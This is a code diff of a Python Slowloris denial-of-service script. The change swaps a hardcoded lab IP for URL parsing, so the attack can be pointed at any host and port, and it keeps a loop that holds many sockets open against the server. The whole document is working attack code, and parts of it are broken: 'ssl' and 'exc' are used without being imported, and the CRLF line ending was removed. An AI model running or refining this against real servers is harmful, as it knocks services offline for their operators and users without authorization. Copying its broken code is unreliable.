@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
+
 import time
 import random
 import socket
-import sys
 import logging
+from store import store_data
+from urllib.parse import urlparse
 
-USERAGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
 
 class _(socket.socket):
 
     def send_line(self, line):
-        line = f"{line}\r\n"
         self.send(line.encode("utf-8"))
 
     def send_header(self, name, value):
@@ -21,33 +21,47 @@ socket.socket = _
 
 _list_of_sockets = []
 
-class start_attack(object):
-
-    __slots__=("_host", "_port")
-
-
-    def __init__(self, _host, _port):
-        self._host = _host
-        self._port = _port
+class start_attack():
 
     @classmethod
-    def initialize_socket(self):
+    def form_url(self, url: str, ssl: bool = False):
+        port = None
+        try:
+            res = urlparse(url)
+            port = res.port
+        except Exception as ex:
+            raise exc.InvalidURIError("Invalid uri string") from ex
+        else:
+            # scheme will be validated in the constructor
+            if res.scheme:
+                ssl = res.scheme[-1] == "s"
+            if not port:
+                port = 443 if ssl else 80
+
+            return store_data(
+                scheme=res.scheme or "http",
+                host=res.hostname,
+                port=port,
+                path=res.path or "/",
+                ssl=ssl,
+            )
+
+
+    @classmethod
+    def initialize_socket(self, m):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
-
-        host = self._host
-        port = self._port
-        s.connect(('192.168.56.102', 80))
-        if self._port == 443:
+        s.connect((m.host, m.port))
+        if m.port == 443:
             s = ssl.wrap_socket(s)
-        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-        s.send_header("User-Agent", USERAGENT)
-        s.send_header("Accpet-Language", "en-Us, en, q=0.5")
+        for line in m.lines:
+            s.send_line(line)
+
         return s
 
 
     @classmethod
-    def perform_attack(self, s, socket_count):
+    def perform_attack(self, s, socket_count, m):
        while True:
         try:
             for s in list(_list_of_sockets):
@@ -59,7 +73,7 @@ class start_attack(object):
 
             for _ in range(socket_count - len(_list_of_sockets)):
                 try:
-                    s = self.initialize_socket()
+                    s = self.initialize_socket(m)
                     if s:
                         _list_of_sockets.append(s)
                 except socket.error as e:
@@ -70,6 +84,3 @@ class start_attack(object):
         except (KeyboardInterrupt, SystemExit):
             logging.info("slowloris attack has been stopped")
             break
-
-
-
